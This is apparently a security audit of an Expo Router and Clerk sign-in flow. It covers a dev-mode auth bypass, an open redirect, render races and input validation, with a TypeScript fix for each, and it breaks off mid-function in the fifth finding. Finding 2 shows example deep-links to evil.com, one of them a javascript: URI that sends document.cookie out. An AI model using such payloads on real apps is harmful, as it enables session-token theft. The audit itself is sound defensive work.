# Security Analysis: Expo Router + Clerk Authentication Flow

---

## Finding 1: Dev Bypass Mode Can Reach Production (Critical)

### Severity: Critical (CVSS 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Root Cause

The `authEnabled` flag is computed at **module evaluation time** from an environment variable that defaults to `''` when absent:

```typescript
// app/_layout.tsx
const publishableKey = process.env.EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY ?? '';
const authEnabled = publishableKey.startsWith('pk_');
```

`EXPO_PUBLIC_*` variables are **inlined at build time** by the Metro bundler. If the CI/CD pipeline builds a release without the variable set (e.g., a missing secret in a deployment environment, a branch build, a feature-flag rollout), the compiled bundle contains `authEnabled = false` with no runtime override possible. There is no dead-man's switch, no build-time assertion, and no runtime check. The entire auth wall silently disappears in production.

Additionally, the `(tabs)/_layout.tsx` file re-derives `authEnabled` independently, creating a second point of failure and a potential split-brain situation if the two evaluations ever diverge (e.g., after a partial refactor).

### Fix

**Step 1 — Fail the build if the key is missing in non-dev environments:**

```typescript
// scripts/check-env.ts  (run as part of `eas build` pre-build hook)
const key = process.env.EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY ?? '';
const isCI = process.env.CI === 'true';
const profile = process.env.EAS_BUILD_PROFILE ?? 'development'; // set by EAS

if (isCI && profile !== 'development' && !key.startsWith('pk_live_')) {
  console.error(
    '[FATAL] EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY is missing or is a test key ' +
    `in build profile "${profile}". Aborting build.`
  );
  process.exit(1);
}
```

Add to `package.json`:
```json
{
  "scripts": {
    "prebuild": "ts-node scripts/check-env.ts"
  }
}
```

**Step 2 — Single source of truth for the flag, with an explicit assertion:**

```typescript
// lib/authConfig.ts
const publishableKey = process.env.EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY ?? '';

if (__DEV__ === false && !publishableKey.startsWith('pk_')) {
  // This will surface as a visible red-screen crash in a release build
  // before any navigation occurs — far better than silent bypass.
  throw new Error(
    'EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY is not configured. ' +
    'Authentication is required in production builds.'
  );
}

export const PUBLISHABLE_KEY = publishableKey;
export const AUTH_ENABLED = publishableKey.startsWith('pk_');
```

```typescript
// app/_layout.tsx — replace local derivation
import { PUBLISHABLE_KEY, AUTH_ENABLED } from '@/lib/authConfig';

// app/(tabs)/_layout.tsx — replace local derivation
import { AUTH_ENABLED } from '@/lib/authConfig';
```

**Step 3 — Add to `eas.json` profile guards:**

```json
{
  "build": {
    "production": {
      "env": {
        "EXPO_PUBLIC_CLERK_PUBLISHABLE_KEY": "REQUIRED"
      }
    }
  }
}
```

---

## Finding 2: Unguarded `afterSignInUrl` Open Redirect (High)

### Severity: High (CVSS 8.1 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

### Root Cause

The sign-in screen reads `afterSignInUrl` from query parameters and passes it **unsanitised** to `router.replace()`:

```typescript
// app/(auth)/sign-in.tsx
const { afterSignInUrl } = useLocalSearchParams<{ afterSignInUrl?: string }>();
const postAuthDestination: string = afterSignInUrl ?? '/';
// ...
router.replace(postAuthDestination as never); // ← arbitrary URL from attacker
```

An attacker can craft a deep-link:

```
myapp://sign-in?afterSignInUrl=https://evil.com/harvest
```

Or on web (if the app is served there):
```
https://app.example.com/sign-in?afterSignInUrl=javascript:fetch('https://evil.com?t='+document.cookie)
```

After successful authentication the user is silently redirected to the attacker's URL. This is an **open redirect** vulnerability (OWASP A01:2021) and can be chained with phishing to steal session tokens handed back via the redirect URI.

The same issue affects the `__clerk_ticket` flow since both code paths use `postAuthDestination`.

### Fix

```typescript
// lib/navigation.ts
const ALLOWED_HOSTS = new Set([
  'app.horario.com',
  'staging.horario.com',
]);

/**
 * Validates a post-auth destination.
 * - Accepts relative paths beginning with /
 * - Rejects absolute URLs pointing to external hosts
 * - Rejects javascript: and data: URIs
 */
export function sanitisePostAuthDestination(raw: string | undefined): string {
  const DEFAULT = '/';
  if (!raw) return DEFAULT;

  // Allow plain relative paths (most common case)
  if (raw.startsWith('/') && !raw.startsWith('//')) {
    // Guard against path-traversal or exotic inputs
    try {
      // Resolve against a dummy base to normalise the path
      const resolved = new URL(raw, 'https://placeholder.internal');
      // Reject if the resolver stripped the leading slash (shouldn't happen)
      if (!resolved.pathname.startsWith('/')) return DEFAULT;
      return resolved.pathname + resolved.search + resolved.hash;
    } catch {
      return DEFAULT;
    }
  }

  // For absolute URLs, verify the host is allow-listed
  try {
    const parsed = new URL(raw);
    if (
      (parsed.protocol === 'https:' || parsed.protocol === 'http:') &&
      ALLOWED_HOSTS.has(parsed.hostname)
    ) {
      return raw;
    }
  } catch {
    // Not a valid URL — fall through to default
  }

  return DEFAULT;
}
```

```typescript
// app/(auth)/sign-in.tsx
import { sanitisePostAuthDestination } from '@/lib/navigation';

const { __clerk_ticket: clerkTicket, afterSignInUrl } = useLocalSearchParams<{
  __clerk_ticket?: string;
  afterSignInUrl?: string;
}>();

// ← validated; no raw user input reaches router.replace()
const postAuthDestination = sanitisePostAuthDestination(afterSignInUrl);
```

---

## Finding 3: Flash of Protected Content / Missing Splash Guard (High)

### Severity: High (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Root Cause

`AuthGuardedTabLayout` returns `null` while Clerk's `isLoaded` is `false`:

```typescript
function AuthGuardedTabLayout() {
  const { useAuth } = require('@clerk/expo');
  const { isSignedIn, isLoaded } = useAuth();
  if (!isLoaded) return null;          // ← renders nothing, not a blocker
  if (!isSignedIn) return <Redirect href="/(auth)/sign-in" />;
  return <TabNavigator extraHeaderRight={<SignOutButton />} />;
}
```

`null` in React Native does not prevent child route components from being **mounted and executing their own data-fetching effects** before the parent re-renders. Depending on Expo Router's internal reconciliation order, the `(tabs)/index` screen component can mount, call APIs, and briefly render private data before `isLoaded` flips to `true` and the redirect fires.

Additionally there is a **separate race** in the ticket flow in `sign-in.tsx`: the `useEffect` sets `loading = true` and then awaits async Clerk calls; during that `await`, `isLoaded` can become true with `isSignedIn = false`, triggering the redirect away from the sign-in screen mid-flow.

### Fix

```typescript
// app/(tabs)/_layout.tsx

import { View, ActivityIndicator } from 'react-native';
import { Colors } from '@/constants/Colors';

function FullScreenLoader() {
  const colorScheme = useColorScheme();
  const colors = Colors[colorScheme ?? 'light'];
  return (
    <View
      style={{ flex: 1, backgroundColor: colors.background, alignItems: 'center', justifyContent: 'center' }}
      // Prevent VoiceOver from reading tab content while loading
      importantForAccessibility="no-hide-descendants"
      accessibilityElementsHidden
    >
      <ActivityIndicator size="large" color={colors.tint} />
    </View>
  );
}

function AuthGuardedTabLayout() {
  const { useAuth } = require('@clerk/expo');
  const { isSignedIn, isLoaded } = useAuth();

  // ← Opaque blocking screen instead of null.
  //   Child route components cannot mount data-fetching effects.
  if (!isLoaded) return <FullScreenLoader />;
  if (!isSignedIn) return <Redirect href="/(auth)/sign-in" />;
  return <TabNavigator extraHeaderRight={<SignOutButton />} />;
}
```

For the ticket race condition in `sign-in.tsx`, hold rendering until the async flow settles:

```typescript
// app/(auth)/sign-in.tsx
// Add a "consuming" gate so the UI does not flash between ticket
// processing and the redirect
const [ticketConsumed, setTicketConsumed] = useState(false);

useEffect(() => {
  if (!isLoaded || !signIn || !clerkTicket) return;
  let cancelled = false;

  async function consumeTicket() {
    setLoading(true);
    setError(null);
    try {
      const result = await signIn!.create({ strategy: 'ticket', ticket: clerkTicket as string });
      if (cancelled) return;
      if (result.status === 'complete') {
        await setActive!({ session: result.createdSessionId });
        setTicketConsumed(true);          // ← signal before navigation
        router.replace(postAuthDestination as never);
      } else {
        setError('Sign-in could not be completed. Please try again.');
        setLoading(false);
      }
    } catch (err: unknown) {
      if (!cancelled) {
        setError(resolveClerkError(err));
        setLoading(false);
      }
    }
  }

  void consumeTicket();
  return () => { cancelled = true; };
}, [isLoaded, clerkTicket]);

// While the ticket is being consumed show only the loader, not the form
if (clerkTicket && !ticketConsumed) {
  return (
    <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}>
      <ActivityIndicator size="large" />
    </View>
  );
}
```

---

## Finding 4: `require('@clerk/expo')` Inside Render Functions — Hook Rules Violation and Prototype Pollution Risk (High)

### Severity: High (CVSS 7.3 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L)

### Root Cause

Both `AuthGuardedTabLayout` and `SignOutButton` call `require('@clerk/expo')` unconditionally inside the component function body on every render:

```typescript
function AuthGuardedTabLayout() {
  const { useAuth } = require('@clerk/expo');   // ← dynamic require in render
  const { isSignedIn, isLoaded } = useAuth();
```

**Problem 1 — React Hook rules:** The hook `useAuth()` is called from a value obtained via a dynamic `require`. React's linter cannot statically verify the call-site, so misuse goes undetected. If the `require` ever returns a different module object (module cache invalidation, hot-reload), React sees a new function reference and may break hook identity tracking.

**Problem 2 — Prototype pollution vector:** `require()` reads from Node/Metro's module registry which is a mutable object. If any dependency (e.g., a malicious or compromised npm package) pollutes `Object.prototype` with a `useAuth` property, the destructure `const { useAuth } = require('@clerk/expo')` will silently pick up the polluted value — an injected function — instead of Clerk's implementation. This could redirect users to an attacker-controlled sign-in URL or suppress the auth check entirely.

**Problem 3 — Tree-shaking:** Dynamic `require` prevents Metro from eliminating unused Clerk code from web bundles, increasing attack surface.

The comment explains the intent ("avoid calling useAuth() when ClerkProvider is not mounted") but this can be achieved more safely.

### Fix

Use a proper conditional component boundary:

```typescript
// app/(tabs)/_layout.tsx

// ── Static import at module level (safe, tree-shakeable) ──────────────────
import { useAuth } from '@clerk/expo';
import { AUTH_ENABLED } from '@/lib/authConfig';

// ── Isolated component — only rendered when ClerkProvider is present ──────
function AuthGuardedTabLayout() {
  // useAuth() is now a statically-imported hook, satisfying Rules of Hooks.
  // This component is only mounted when AUTH_ENABLED is true, which means
  // ClerkProvider is guaranteed to be in the tree (see RootLayout).
  const { isSignedIn, isLoaded } = useAuth();

  if (!isLoaded) return <FullScreenLoader />;
  if (!isSignedIn) return <Redirect href="/(auth)/sign-in" />;
  return <TabNavigator extraHeaderRight={<SignOutButton />} />;
}

function SignOutButton() {
  const { signOut } = useAuth();
  // ... rest unchanged
}

export default function TabLayout() {
  // AUTH_ENABLED is evaluated once at module load from the build-time constant.
  // When false, neither AuthGuardedTabLayout nor SignOutButton are mounted,
  // so useAuth() is never called outside a ClerkProvider.
  if (!AUTH_ENABLED) return <TabNavigator />;
  return <AuthGuardedTabLayout />;
}
```

---

## Finding 5: No Client-Side Password Strength Validation (Medium)

### Severity: Medium (CVSS 6.5 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

### Root Cause

The sign-up form's `canSubmit` check only verifies that the fields are non-empty:

```typescript
// app/(auth)/sign-up.tsx
const canSubmit = Boolean(email && password) && !loading;
```

The placeholder says "Min 8 characters" but this is never enforced. A user can register with the password `"a"` — the validation is delegated entirely to Clerk's backend. While Clerk does reject weak passwords, the error only appears after a full network round-trip with no inline guidance during typing. More critically, there is **no email format validation**: submitting `"not-an-email"` as the identifier will reach the network before failing.

### Fix

```typescript
// lib/validation.ts
export interface FieldError {
  email?: string;
  password?: string;
}

// RFC 5322 simplified — rejects the most common typos without false positives
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

const PASSWORD_MIN_LENGTH = 10; // NIST SP 800-63B minimum for memorised secrets
const PASSWORD_MAX_LENGTH = 128; // prevent denial-of-service via bcrypt

export function validateSignUpFields(email: string, password: string): FieldError {
  const errors: FieldError = {};